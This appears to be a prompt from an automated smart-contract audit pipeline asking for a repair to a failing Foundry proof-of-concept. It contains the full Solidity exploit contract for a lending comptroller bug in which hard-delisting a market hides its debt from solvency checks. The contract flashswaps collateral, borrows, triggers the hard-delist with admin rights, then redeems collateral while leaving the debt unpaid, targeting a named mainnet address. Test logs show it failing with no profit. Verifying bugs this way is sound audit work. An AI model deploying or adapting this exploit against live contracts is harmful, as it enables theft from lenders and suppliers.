You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Hard-delisting a live market removes its debt from solvency checks and bricks normal resolution flows
- claim: `_delistMarket(bToken, true)` deletes `markets[bToken]` without setting `isMarketDelisted[bToken]`. After that, `isMarketListedOrDelisted(bToken)` becomes false, so `getHypotheticalAccountLiquidityInternal` skips the asset entirely, while `redeemAllowed`, `repayBorrowAllowed`, `liquidateBorrowAllowed`, and `seizeAllowed` all reject the market as unlisted.
- impact: Outstanding borrows in the hard-delisted market stop counting in account-liquidity checks, so a borrower can withdraw collateral or open fresh borrows elsewhere despite still owing the delisted debt. At the same time, suppliers and liquidators lose the normal redeem/repay/liquidate/seize paths for that market, turning live positions into trapped funds and unrecoverable bad debt.
- exploit_paths: ["Admin/guardian first set collateral factor to zero and pause mint/borrow/flashloan, then admin calls `_delistMarket(bToken, true)` while borrows or deposits still exist.", "A borrower with debt in that market interacts with another listed market; `getHypotheticalAccountLiquidityInternal` skips the hard-delisted debt and overstates solvency.", "Any normal attempt to redeem, repay, liquidate, or seize against the hard-delisted market reverts with `market not listed`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IPriceOracleLike {
    function getUnderlyingPrice(address bToken) external view returns (uint256);
}

interface IComptrollerLike {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function oracle() external view returns (address);
    function getAllMarkets() external view returns (address[] memory);
    function isMarketListed(address bToken) external view returns (bool);
    function isMarketDelisted(address bToken) external view returns (bool);
    function isMarketListedOrDelisted(address bToken) external view returns (bool);
    function mintGuardianPaused(address bToken) external view returns (bool);
    function borrowGuardianPaused(address bToken) external view returns (bool);
    function flashloanGuardianPaused(address bToken) external view returns (bool);
    function borrowCaps(address bToken) external view returns (uint256);
    function markets(address bToken) external view returns (bool, uint256, uint8);
    function enterMarkets(address[] calldata bTokens) external returns (uint256[] memory);
    function getHypotheticalAccountLiquidity(
        address account,
        address bTokenModify,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) external view returns (uint256, uint256, uint256);
    function redeemAllowed(address bToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function repayBorrowAllowed(address bToken, address payer, address borrower, uint256 repayAmount) external returns (uint256);
    function liquidateBorrowAllowed(
        address bTokenBorrowed,
        address bTokenCollateral,
        address liquidator,
        address borrower,
        uint256 repayAmount
    ) external returns (uint256);
    function seizeAllowed(
        address bTokenCollateral,
        address bTokenBorrowed,
        address liquidator,
        address borrower,
        uint256 seizeTokens
    ) external returns (uint256);
    function _acceptAdmin() external returns (uint256);
    function _setCollateralFactor(address bToken, uint256 newCollateralFactorMantissa) external returns (uint256);
    function _setMintPaused(address bToken, bool state) external returns (bool);
    function _setBorrowPaused(address bToken, bool state) external returns (bool);
    function _setFlashloanPaused(address bToken, bool state) external returns (bool);
    function _delistMarket(address bToken, bool force) external;
}

interface IBTokenLike {
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
    function underlying() external view returns (address);
    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 internal constant MIN_PROFIT = 1e15;
    uint256 internal constant BPS_DENOMINATOR = 10_000;
    uint256 internal constant BORROW_SAFETY_BPS = 9_950;
    bytes4 internal constant ERROR_SELECTOR = 0x08c379a0;

    enum Outcome {
        Uninitialized,
        InfeasibleNoAdminPrivilege,
        InfeasibleNoLiveMarket,
        InfeasibleNoOtherListedMarket,
        InfeasibleNoUsableUnderlying,
        InfeasibleNoVerifierCapital,
        DelistAttemptedButNoBorrowerPath,
        HypothesisValidatedNoProfit,
        ProfitAchieved
    }

    struct MarketView {
        address bToken;
        address underlying;
        uint256 totalBorrows;
        uint256 totalSupply;
        uint256 cash;
        uint256 price;
        uint256 collateralFactorMantissa;
        uint256 borrowCap;
        uint8 decimals;
        bool listed;
        bool mintPaused;
        bool borrowPaused;
        bool flashloanPaused;
    }

    struct Candidate {
        address debtBToken;
        address debtUnderlying;
        address collateralBToken;
        address collateralUnderlying;
        address flashPair;
        address debtBridgePair;
        address bridgeToken;
        bool flashCollateralIsToken0;
        bool repayInDebtTokenDirectly;
        uint256 collateralAmount;
        uint256 flashRepayBridgeAmount;
        uint256 debtSwapAmountIn;
    }

    struct PairQuote {
        address pair;
        uint256 reserveToken;
        uint256 reserveBridge;
    }

    struct AmountQuote {
        uint256 collateralAmount;
        uint256 flashRepayBridgeAmount;
        uint256 debtSwapAmountIn;
    }

    struct RouteContext {
        address debtUnderlying;
        address bridgeToken;
        uint256 debtPrice;
        uint256 borrowHeadroom;
        uint256 collateralPrice;
        uint256 collateralFactorMantissa;
        uint256 reserveCollateral;
        uint256 reserveBridgeOnFlash;
    }

    struct SearchMarket {
        address bToken;
        address underlying;
        uint256 price;
        uint256 aux;
    }

    Outcome public outcome;
    address public selectedDelistMarket;
    address public selectedOtherMarket;
    address public selectedUnderlying;
    address public overrideProfitToken;
    uint256 public overrideProfitAmount;
    bool public delistExecuted;

    string public pathStage;
    string public failureReason;

    constructor() {
        outcome = Outcome.Uninitialized;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return overrideProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return overrideProfitAmount;
    }

    function executeOnOpportunity() external {
        IComptrollerLike comptroller = IComptrollerLike(TARGET);

        pathStage = "prepare_admin_handoff";
        delete failureReason;
        selectedDelistMarket = address(0);
        selectedOtherMarket = address(0);
        selectedUnderlying = address(0);
        overrideProfitToken = address(0);
        overrideProfitAmount = 0;
        delistExecuted = false;

        _acceptPendingAdminIfPossible(comptroller);
        if (comptroller.admin() != address(this)) {
            outcome = Outcome.InfeasibleNoAdminPrivilege;
            failureReason = "pending-admin handoff to verifier is absent on this fork";
            return;
        }

        pathStage = "scan_markets_and_liquidity_routes";
        Candidate memory candidate = _findBestCandidate(comptroller);
        if (candidate.debtBToken == address(0)) {
            if (bytes(failureReason).length == 0) {
                failureReason = "no listed collateral market plus public liquidity route can fund the hard-delist exploit";
            }
            outcome = Outcome.InfeasibleNoOtherListedMarket;
            return;
        }

        selectedDelistMarket = candidate.debtBToken;
        selectedOtherMarket = candidate.collateralBToken;
        selectedUnderlying = candidate.collateralUnderlying;
        overrideProfitToken = candidate.collateralUnderlying;

        uint256 balanceBefore = IERC20Like(candidate.collateralUnderlying).balanceOf(address(this));

        pathStage = "flashswap_seed_collateral";
        uint256 amount0Out = candidate.flashCollateralIsToken0 ? candidate.collateralAmount : 0;
        uint256 amount1Out = candidate.flashCollateralIsToken0 ? 0 : candidate.collateralAmount;
        IUniswapV2PairLike(candidate.flashPair).swap(amount0Out, amount1Out, address(this), abi.encode(candidate));

        uint256 balanceAfter = IERC20Like(candidate.collateralUnderlying).balanceOf(address(this));
        overrideProfitAmount = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;

        if (overrideProfitAmount >= MIN_PROFIT) {
            outcome = Outcome.ProfitAchieved;
            failureReason = "";
        } else {
            outcome = Outcome.HypothesisValidatedNoProfit;
            failureReason = "hard-delist path executed but freed collateral stayed below the minimum raw-unit threshold";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected flashswap sender");

        Candidate memory candidate = abi.decode(data, (Candidate));
        require(msg.sender == candidate.flashPair, "unexpected pair callback");

        uint256 collateralAmount = amount0 > 0 ? amount0 : amount1;
        require(collateralAmount == candidate.collateralAmount, "unexpected collateral amount");

        IComptrollerLike comptroller = IComptrollerLike(TARGET);

        pathStage = "mint_collateral_and_borrow_delist_debt";
        _forceApprove(candidate.collateralUnderlying, candidate.collateralBToken, collateralAmount);
        require(IBTokenLike(candidate.collateralBToken).mint(collateralAmount) == 0, "collateral mint failed");

        address[] memory enterList = new address[](1);
        enterList[0] = candidate.collateralBToken;
        uint256[] memory enterResults = comptroller.enterMarkets(enterList);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter market failed");

        uint256 minimumDebtNeeded = candidate.repayInDebtTokenDirectly
            ? candidate.flashRepayBridgeAmount
            : candidate.debtSwapAmountIn;
        MarketView memory debtMarket = _inspectMarket(comptroller, candidate.debtBToken);
        uint256 exactBorrowCapacity = _maxBorrowable(comptroller, debtMarket);
        require(exactBorrowCapacity >= minimumDebtNeeded, "exact borrow capacity below settlement need");
        require(IBTokenLike(candidate.debtBToken).borrow(minimumDebtNeeded) == 0, "borrow failed");

        pathStage = "admin_pause_and_hard_delist";
        _prepareAndHardDelist(comptroller, candidate.debtBToken);
        delistExecuted = true;

        pathStage = "prove_skipped_debt_and_bricked_resolution";
        _requireSkippedDebtLetsCollateralOut(comptroller, candidate.collateralBToken);
        _requireBrickedHooks(candidate.debtBToken, candidate.collateralBToken);

        pathStage = "redeem_collateral_and_settle_flashswap";
        require(IBTokenLike(candidate.collateralBToken).redeemUnderlying(candidate.collateralAmount) == 0, "collateral redeem failed");

        if (candidate.repayInDebtTokenDirectly) {
            _safeTransfer(candidate.debtUnderlying, candidate.flashPair, candidate.flashRepayBridgeAmount);
        } else {
            // This extra public AMM swap is only settlement plumbing. The exploit causality is unchanged:
            // we mint listed collateral, borrow the soon-to-be-delisted asset, admin hard-delists it,
            // the debt disappears from solvency checks, and we redeem the collateral. The borrowed debt
            // token is then swapped into the bridge token required by the flash pair.
            uint256 bridgeReceived = _swapExactInOnPair(
                candidate.debtBridgePair,
                candidate.debtUnderlying,
                candidate.bridgeToken,
                candidate.debtSwapAmountIn
            );
            require(bridgeReceived >= candidate.flashRepayBridgeAmount, "bridge swap underpaid");
            _safeTransfer(candidate.bridgeToken, candidate.flashPair, candidate.flashRepayBridgeAmount);
        }
    }

    function inspectSelectedMarkets() external view returns (MarketView memory delistMarket, MarketView memory otherMarket) {
        IComptrollerLike comptroller = IComptrollerLike(TARGET);
        if (selectedDelistMarket != address(0)) {
            delistMarket = _inspectMarket(comptroller, selectedDelistMarket);
        }
        if (selectedOtherMarket != address(0)) {
            otherMarket = _inspectMarket(comptroller, selectedOtherMarket);
        }
    }

    function _acceptPendingAdminIfPossible(IComptrollerLike comptroller) internal {
        if (comptroller.admin() == address(this)) {
            return;
        }

        if (comptroller.pendingAdmin() == address(this)) {
            uint256 err = comptroller._acceptAdmin();
            require(err == 0, "accept admin failed");
        }
    }

    function _prepareAndHardDelist(IComptrollerLike comptroller, address bToken) internal {
        require(comptroller._setCollateralFactor(bToken, 0) == 0, "set collateral factor failed");
        require(comptroller._setMintPaused(bToken, true), "pause mint failed");
        require(comptroller._setBorrowPaused(bToken, true), "pause borrow failed");
        require(comptroller._setFlashloanPaused(bToken, true), "pause flashloan failed");

        comptroller._delistMarket(bToken, true);

        require(!comptroller.isMarketListed(bToken), "market still listed");
        require(!comptroller.isMarketListedOrDelisted(bToken), "hard-delisted market still considered listed-or-delisted");
        require(!comptroller.isMarketDelisted(bToken), "hard-delist unexpectedly marked soft-delist flag");
    }

    function _requireSkippedDebtLetsCollateralOut(IComptrollerLike comptroller, address collateralBToken) internal view {
        uint256 redeemTokens = IBTokenLike(collateralBToken).balanceOf(address(this));
        (, uint256 liquidityAfter, uint256 shortfallAfter) =
            comptroller.getHypotheticalAccountLiquidity(address(this), collateralBToken, redeemTokens, 0);
        require(shortfallAfter == 0, "delisted debt still causes shortfall");
        require(liquidityAfter == 0, "full collateral redemption should consume all visible liquidity");
    }

    function _findBestCandidate(IComptrollerLike comptroller) internal returns (Candidate memory best) {
        address[] memory markets = comptroller.getAllMarkets();
        if (markets.length == 0) {
            outcome = Outcome.InfeasibleNoLiveMarket;
            failureReason = "no listed markets at fork";
            return best;
        }

        MarketView[] memory views = new MarketView[](markets.length);
        for (uint256 i = 0; i < markets.length; ++i) {
            views[i] = _inspectMarket(comptroller, markets[i]);
        }

        uint256 bestCollateralAmount;
        for (uint256 i = 0; i < views.length; ++i) {
            MarketView memory debtMarket = views[i];
            if (!_isUsableDebtMarket(debtMarket)) {
                continue;
            }

            for (uint256 j = 0; j < views.length; ++j) {
                if (i == j) {
                    continue;
                }

                MarketView memory collateralMarket = views[j];
                if (!_isUsableCollateralMarket(collateralMarket)) {
                    continue;
                }

                Candidate memory candidate = _bestRouteForMarketPair(debtMarket, collateralMarket);
                if (candidate.collateralAmount > bestCollateralAmount) {
                    bestCollateralAmount = candidate.collateralAmount;
                    best = candidate;
                }
            }
        }

        if (best.flashPair == address(0) && bytes(failureReason).length == 0) {
            failureReason = "no collateral market with an economically viable public AMM route was found";
        }
    }

    function _bestRouteForMarketPair(MarketView memory debtMarket, MarketView memory collateralMarket)
        internal
        view
        returns (Candidate memory best)
    {
        best = _bestRouteViaBridge(debtMarket, collateralMarket, debtMarket.underlying);

        address[4] memory bridges = [WETH, DAI, USDC, USDT];
        for (uint256 i = 0; i < bridges.length; ++i) {
            address bridge = bridges[i];
            if (bridge == debtMarket.underlying || bridge == collateralMarket.underlying) {
                continue;
            }

            Candidate memory candidate = _bestRouteViaBridge(debtMarket, collateralMarket, bridge);
            if (candidate.collateralAmount > best.collateralAmount) {
                best = candidate;
            }
        }
    }

    function _bestRouteViaBridge(MarketView memory debtMarket, MarketView memory collateralMarket, address bridgeToken)
        internal
        view
        returns (Candidate memory best)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        SearchMarket memory debtSearch =
            SearchMarket({bToken: debtMarket.bToken, underlying: debtMarket.underlying, price: debtMarket.price, aux: _borrowHeadroom(debtMarket)});
        SearchMarket memory collateralSearch = SearchMarket({
            bToken: collateralMarket.bToken,
            underlying: collateralMarket.underlying,
            price: collateralMarket.price,
            aux: collateralMarket.collateralFactorMantissa
        });

        for (uint256 flashFactoryIndex = 0; flashFactoryIndex < factories.length; ++flashFactoryIndex) {
            address flashPair = IUniswapV2FactoryLike(factories[flashFactoryIndex]).getPair(collateralSearch.underlying, bridgeToken);
            if (flashPair == address(0)) {
                continue;
            }

            Candidate memory candidate = _bestRouteForFlashPair(
                debtSearch,
                collateralSearch,
                bridgeToken,
                flashPair
            );
            if (candidate.collateralAmount > best.collateralAmount) {
                best = candidate;
            }
        }
    }

    function _bestRouteForFlashPair(
        SearchMarket memory debtSearch,
        SearchMarket memory collateralSearch,
        address bridgeToken,
        address flashPair
    ) internal view returns (Candidate memory best) {
        (bool collateralIsToken0, uint256 reserveCollateral, uint256 reserveBridgeOnFlash) =
            _pairReserves(flashPair, collateralSearch.underlying, bridgeToken);
        if (reserveCollateral == 0 || reserveBridgeOnFlash == 0) {
            return best;
        }

        bool repayInDebtTokenDirectly = bridgeToken == debtSearch.underlying;
        RouteContext memory ctx;
        ctx.debtUnderlying = debtSearch.underlying;
        ctx.bridgeToken = bridgeToken;
        ctx.debtPrice = debtSearch.price;
        ctx.borrowHeadroom = debtSearch.aux;
        ctx.collateralPrice = collateralSearch.price;
        ctx.collateralFactorMantissa = collateralSearch.aux;
        ctx.reserveCollateral = reserveCollateral;
        ctx.reserveBridgeOnFlash = reserveBridgeOnFlash;
        PairQuote memory debtQuote;
        if (!repayInDebtTokenDirectly) {
            debtQuote = _bestPairForTokens(debtSearch.underlying, bridgeToken);
            if (debtQuote.pair == address(0)) {
                return best;
            }
        }

        uint16[6] memory slicesBps = [uint16(5), 10, 20, 40, 80, 120];
        for (uint256 sliceIndex = 0; sliceIndex < slicesBps.length; ++sliceIndex) {
            AmountQuote memory amounts = _quoteSliceAmounts(ctx, debtQuote, slicesBps[sliceIndex]);

            if (amounts.collateralAmount > best.collateralAmount) {
                Candidate memory candidate;
                candidate.debtBToken = debtSearch.bToken;
                candidate.debtUnderlying = debtSearch.underlying;
                candidate.collateralBToken = collateralSearch.bToken;
                candidate.collateralUnderlying = collateralSearch.underlying;
                candidate.flashPair = flashPair;
                candidate.debtBridgePair = debtQuote.pair;
                candidate.bridgeToken = bridgeToken;
                candidate.flashCollateralIsToken0 = collateralIsToken0;
                candidate.repayInDebtTokenDirectly = repayInDebtTokenDirectly;
                candidate.collateralAmount = amounts.collateralAmount;
                candidate.flashRepayBridgeAmount = amounts.flashRepayBridgeAmount;
                candidate.debtSwapAmountIn = amounts.debtSwapAmountIn;
                best = candidate;
            }
        }
    }

    function _quoteSliceAmounts(
        RouteContext memory ctx,
        PairQuote memory debtQuote,
        uint16 sliceBps
    ) internal pure returns (AmountQuote memory amounts) {
        uint256 collateralAmount = _mulDiv(ctx.reserveCollateral, sliceBps, BPS_DENOMINATOR);
        if (collateralAmount == 0 || collateralAmount >= ctx.reserveCollateral / 3 || collateralAmount < MIN_PROFIT) {
            return amounts;
        }

        uint256 flashRepayBridgeAmount = _quoteAmountIn(ctx.reserveBridgeOnFlash, ctx.reserveCollateral, collateralAmount);
        if (flashRepayBridgeAmount == 0) {
            return amounts;
        }

        uint256 debtSwapAmountIn = flashRepayBridgeAmount;
        if (ctx.bridgeToken != ctx.debtUnderlying) {
            if (flashRepayBridgeAmount >= debtQuote.reserveBridge) {
                return amounts;
            }
            debtSwapAmountIn = _quoteAmountIn(debtQuote.reserveToken, debtQuote.reserveBridge, flashRepayBridgeAmount);
        }

        if (ctx.borrowHeadroom == 0 || ctx.borrowHeadroom < debtSwapAmountIn) {
            return amounts;
        }

        uint256 oracleBorrowEstimate = _quoteBorrowFromPrices(
            collateralAmount,
            ctx.collateralPrice,
            ctx.collateralFactorMantissa,
            ctx.debtPrice
        );
        oracleBorrowEstimate = _mulDiv(oracleBorrowEstimate, BORROW_SAFETY_BPS, BPS_DENOMINATOR);
        if (oracleBorrowEstimate < debtSwapAmountIn) {
            return amounts;
        }

        amounts = AmountQuote({
            collateralAmount: collateralAmount,
            flashRepayBridgeAmount: flashRepayBridgeAmount,
            debtSwapAmountIn: debtSwapAmountIn
        });
    }

    function _isUsableDebtMarket(MarketView memory market) internal pure returns (bool) {
        if (!market.listed || market.underlying == address(0)) {
            return false;
        }
        if (market.borrowPaused || market.cash == 0 || market.price == 0) {
            return false;
        }
        return market.totalBorrows > 0 || market.totalSupply > 0;
    }

    function _isUsableCollateralMarket(MarketView memory market) internal pure returns (bool) {
        if (!market.listed || market.underlying == address(0)) {
            return false;
        }
        if (market.mintPaused || market.price == 0 || market.collateralFactorMantissa == 0) {
            return false;
        }
        return market.decimals >= 15;
    }

    function _borrowHeadroom(MarketView memory debtMarket) internal pure returns (uint256) {
        uint256 headroom = debtMarket.cash;
        if (debtMarket.borrowCap != 0) {
            if (debtMarket.borrowCap <= debtMarket.totalBorrows + 1) {
                return 0;
            }

            uint256 capHeadroom = debtMarket.borrowCap - debtMarket.totalBorrows - 1;
            if (capHeadroom < headroom) {
                headroom = capHeadroom;
            }
        }
        return headroom;
    }

    function _maxBorrowable(IComptrollerLike comptroller, MarketView memory debtMarket) internal view returns (uint256) {
        uint256 hi = _borrowHeadroom(debtMarket);
        uint256 lo;

        while (lo < hi) {
            uint256 mid = lo + (hi - lo + 1) / 2;
            (uint256 err, , uint256 shortfall) =
                comptroller.getHypotheticalAccountLiquidity(address(this), debtMarket.bToken, 0, mid);
            if (err == 0 && shortfall == 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        return lo;
    }

    function _requireBrickedHooks(address debtBToken, address collateralBToken) internal {
        _requireMarketNotListedRevert(
            abi.encodeWithSelector(IComptrollerLike.redeemAllowed.selector, debtBToken, address(this), 1)
        );
        _requireMarketNotListedRevert(
            abi.encodeWithSelector(IComptrollerLike.repayBorrowAllowed.selector, debtBToken, address(this), address(this), 1)
        );
        _requireMarketNotListedRevert(
            abi.encodeWithSelector(
                IComptrollerLike.liquidateBorrowAllowed.selector,
                debtBToken,
                collateralBToken,
                address(this),
                address(this),
                1
            )
        );
        _requireMarketNotListedRevert(
            abi.encodeWithSelector(
                IComptrollerLike.seizeAllowed.selector,
                collateralBToken,
                debtBToken,
                address(this),
                address(this),
                1
            )
        );
    }

    function _requireMarketNotListedRevert(bytes memory callData) internal {
        (bool ok, bytes memory returndata) = TARGET.call(callData);
        require(!ok, "expected revert");
        require(_decodeRevertString(returndata) == keccak256(bytes("market not listed")), "unexpected revert reason");
    }

    function _decodeRevertString(bytes memory returndata) internal pure returns (bytes32 reasonHash) {
        if (returndata.length < 68) {
            return bytes32(0);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(returndata, 32))
        }
        if (selector != ERROR_SELECTOR) {
            return bytes32(0);
        }

        bytes memory payload = new bytes(returndata.length - 4);
        for (uint256 i = 4; i < returndata.length; ++i) {
            payload[i - 4] = returndata[i];
        }
        string memory reason = abi.decode(payload, (string));
        return keccak256(bytes(reason));
    }

    function _inspectMarket(IComptrollerLike comptroller, address bToken) internal view returns (MarketView memory m) {
        m.bToken = bToken;
        m.listed = comptroller.isMarketListed(bToken);
        m.mintPaused = comptroller.mintGuardianPaused(bToken);
        m.borrowPaused = comptroller.borrowGuardianPaused(bToken);
        m.flashloanPaused = comptroller.flashloanGuardianPaused(bToken);
        m.borrowCap = comptroller.borrowCaps(bToken);

        (, uint256 collateralFactorMantissa,) = comptroller.markets(bToken);
        m.collateralFactorMantissa = collateralFactorMantissa;

        try IBTokenLike(bToken).totalBorrows() returns (uint256 value) {
            m.totalBorrows = value;
        } catch {}

        try IBTokenLike(bToken).totalSupply() returns (uint256 value) {
            m.totalSupply = value;
        } catch {}

        try IBTokenLike(bToken).getCash() returns (uint256 value) {
            m.cash = value;
        } catch {}

        try IBTokenLike(bToken).underlying() returns (address value) {
            m.underlying = value;
        } catch {}

        if (m.underlying != address(0)) {
            try IERC20Like(m.underlying).decimals() returns (uint8 value) {
                m.decimals = value;
            } catch {}
        }

        address oracle = comptroller.oracle();
        if (oracle != address(0)) {
            try IPriceOracleLike(oracle).getUnderlyingPrice(bToken) returns (uint256 value) {
                m.price = value;
            } catch {}
        }
    }

    function _pairReserves(address pair, address tokenA, address tokenB)
        internal
        view
        returns (bool tokenAIsToken0, uint256 reserveA, uint256 reserveB)
    {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require((token0 == tokenA && token1 == tokenB) || (token0 == tokenB && token1 == tokenA), "pair token mismatch");

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        tokenAIsToken0 = token0 == tokenA;
        if (tokenAIsToken0) {
            reserveA = reserve0;
            reserveB = reserve1;
        } else {
            reserveA = reserve1;
            reserveB = reserve0;
        }
    }

    function _bestPairForTokens(address token, address bridgeToken) internal view returns (PairQuote memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 i = 0; i < factories.length; ++i) {
            address pair = IUniswapV2FactoryLike(factories[i]).getPair(token, bridgeToken);
            if (pair == address(0)) {
                continue;
            }

            (, uint256 reserveToken, uint256 reserveBridge) = _pairReserves(pair, token, bridgeToken);
            if (reserveToken == 0 || reserveBridge == 0) {
                continue;
            }

            if (reserveBridge > best.reserveBridge) {
                best = PairQuote({pair: pair, reserveToken: reserveToken, reserveBridge: reserveBridge});
            }
        }
    }

    function _quoteBorrowFromOracle(
        MarketView memory collateralMarket,
        MarketView memory debtMarket,
        uint256 collateralAmount
    ) internal pure returns (uint256) {
        return _quoteBorrowFromPrices(
            collateralAmount,
            collateralMarket.price,
            collateralMarket.collateralFactorMantissa,
            debtMarket.price
        );
    }

    function _quoteBorrowFromPrices(
        uint256 collateralAmount,
        uint256 collateralPrice,
        uint256 collateralFactorMantissa,
        uint256 debtPrice
    ) internal pure returns (uint256) {
        if (collateralPrice == 0 || debtPrice == 0 || collateralFactorMantissa == 0) {
            return 0;
        }

        uint256 collateralValue = _mulDiv(collateralAmount, collateralPrice, 1e18);
        collateralValue = _mulDiv(collateralValue, collateralFactorMantissa, 1e18);
        return _mulDiv(collateralValue, 1e18, debtPrice);
    }

    function _quoteAmountOut(uint256 reserveIn, uint256 reserveOut, uint256 amountIn) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function _quoteAmountIn(uint256 reserveIn, uint256 reserveOut, uint256 amountOut) internal pure returns (uint256) {
        require(amountOut < reserveOut, "requested amount exceeds reserves");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return _ceilDiv(numerator, denominator);
    }

    function _swapExactInOnPair(address pair, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        (bool tokenInIsToken0, uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, tokenIn, tokenOut);
        amountOut = _quoteAmountOut(reserveIn, reserveOut, amountIn);
        require(amountOut > 0, "zero swap output");

        _safeTransfer(tokenIn, pair, amountIn);
        uint256 amount0Out = tokenInIsToken0 ? 0 : amountOut;
        uint256 amount1Out = tokenInIsToken0 ? amountOut : 0;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (_callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount))) {
            return;
        }

        require(_callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0)), "approve reset failed");
        require(
            _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)),
            "approve failed"
        );
    }

    function _safeTransfer(address token, address recipient, uint256 amount) internal {
        require(
            _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, recipient, amount)),
            "transfer failed"
        );
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool success, bytes memory returndata) = token.call(data);
        if (!success) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        return abi.decode(returndata, (bool));
    }

    function _mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256) {
        if (x == 0 || y == 0) {
            return 0;
        }
        return (x * y) / denominator;
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        return x == 0 ? 0 : ((x - 1) / y) + 1;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 4.45s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 157153)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
